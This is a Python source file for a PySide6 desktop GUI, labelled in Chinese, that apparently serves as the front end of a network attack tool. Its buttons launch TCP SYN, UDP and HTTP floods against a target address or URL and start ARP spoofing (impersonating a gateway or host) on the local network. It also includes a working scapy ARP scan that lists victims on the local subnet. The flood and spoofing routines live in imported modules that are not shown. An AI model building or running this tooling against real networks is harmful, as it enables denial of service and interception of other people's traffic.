import sys
from urllib.parse import urlparse

import psutil
from PySide6 import QtCore, QtGui
from PySide6.QtCore import QEventLoop, QTimer
from PySide6.QtWidgets import QApplication, QWidget
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp

import arp
import http
import syn
import udp
# import udp
from ui import Ui_Form


class EmittingStr(QtCore.QObject):
    textWritten = QtCore.Signal(str)

    def write(self, text):
        self.textWritten.emit(str(text))
        loop = QEventLoop()
        QTimer.singleShot(100, loop.quit)
        loop.exec_()
        QApplication.processEvents()


class MainWindows(QWidget, Ui_Form):
    result = ''
    info_dict = {}

    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setFixedSize(667, 614)

        self.comboBox.addItems(self.get_iface_info())
        self.comboBox_2.addItems(['冒充网关', '冒充主机'])

        sys.stdout = EmittingStr()
        sys.stdout.textWritten.connect(self.outputWritten)

        self.comboBox.currentTextChanged.connect(self.get_all_ip_of_network)

        self.pushButton.clicked.connect(self.syn)
        self.pushButton_2.clicked.connect(self.udp)
        self.pushButton_3.clicked.connect(self.http)
        self.pushButton_4.clicked.connect(self.arp)

    def syn(self):
        if self.pushButton.text() != '停止攻击':
            dst = self.lineEdit.text()
            dport = self.spinBox.text()
            ts = self.spinBox_2.text()

            syn.syn_flood(dst, int(dport), int(ts))
            self.pushButton.setText('停止攻击')
        else:
            self.pushButton.setText('正在停止')
            syn.flag = 0
            self.pushButton.setText('TCP SYN Flood')

    def udp(self):
        if self.pushButton_2.text() != '停止攻击':
            dst = self.lineEdit.text()
            dport = self.spinBox.text()
            ts = self.spinBox_2.text()

            udp.udp_flood(dst, int(dport), int(ts))
            self.pushButton_2.setText('停止攻击')
        else:
            self.pushButton_2.setText('正在停止')
            udp.flag = 0
            self.pushButton_2.setText('UDP Flood')

    def http(self):
        if self.pushButton_3.text() != '停止攻击':
            url = self.lineEdit_2.text()
            parsed_url = urlparse(url)
            host = parsed_url.hostname
            path = parsed_url.path
            port = parsed_url.port
            if port is None:
                port = 80

            http.http(host, port, path)
            self.pushButton_3.setText('停止攻击')
        else:
            http.flag = 0
            self.pushButton_3.setText('正在停止')
            self.pushButton_3.setText('开始攻击')

    def arp(self):
        if self.pushButton_4.text() != '停止攻击':
            iface = self.comboBox.currentText()
            target = self.comboBox_3.currentText()
            spoof_ip = self.comboBox_4.currentText()
            method = self.comboBox_2.currentIndex()

            arp.arp_spoof(iface, target, spoof_ip, method)
            self.pushButton_4.setText('停止攻击')
        else:
            self.pushButton_4.setText('正在停止')
            arp.flag = 0
            self.pushButton_4.setText('启动')

    def get_iface_info(self):  # 获取所有的网卡
        iface_info = []
        ip_list = []
        info = psutil.net_if_addrs()
        for k, v in info.items():
            for item in v:
                if item[0] == 2 and not item[1] == '127.0.0.1':
                    iface_info.append(k)
                    ip_list.append(item[1])
        self.info_dict = dict(zip(iface_info, ip_list))
        return iface_info

    def get_all_ip_of_network(self, iface):
        ip = self.info_dict[iface]
        ip_list = str(ip) + '/24'
        print(iface, self.info_dict, ip, ip_list)
        network_card = self.comboBox.currentText()
        temp = srp(Ether(dst='FF:FF:FF:FF:FF:FF') / ARP(pdst=ip_list), timeout=3, verbose=False, iface=network_card)
        result = temp[0].res
        target_ips = []
        for item in result:
            target_ip = item[1].getlayer(ARP).fields['psrc']
            target_ips.append(target_ip)

        self.comboBox_3.addItems(target_ips)
        self.comboBox_4.addItems(target_ips)

    def outputWritten(self, text):
        index = self.tabWidget.currentIndex()
        if index == 0:
            cursor = self.textBrowser.textCursor()
            cursor.movePosition(QtGui.QTextCursor.End)
            cursor.insertText(text)
            self.textBrowser.setTextCursor(cursor)
            self.textBrowser.ensureCursorVisible()
        elif index == 1:
            cursor_2 = self.textBrowser_2.textCursor()
            cursor_2.movePosition(QtGui.QTextCursor.End)
            cursor_2.insertText(text)
            self.textBrowser_2.setTextCursor(cursor_2)
            self.textBrowser_2.ensureCursorVisible()
        else:
            cursor_3 = self.textBrowser_3.textCursor()
            cursor_3.movePosition(QtGui.QTextCursor.End)
            cursor_3.insertText(text)
            self.textBrowser_3.setTextCursor(cursor_3)
            self.textBrowser_3.ensureCursorVisible()

    def closeEvent(self, event):
        syn.flag = 0
        udp.flag = 0
        http.flag = 0
        arp.flag = 0
        pass


if __name__ == '__main__':
    app = QApplication([])
    windows = MainWindows()
    windows.show()
    sys.exit(app.exec())
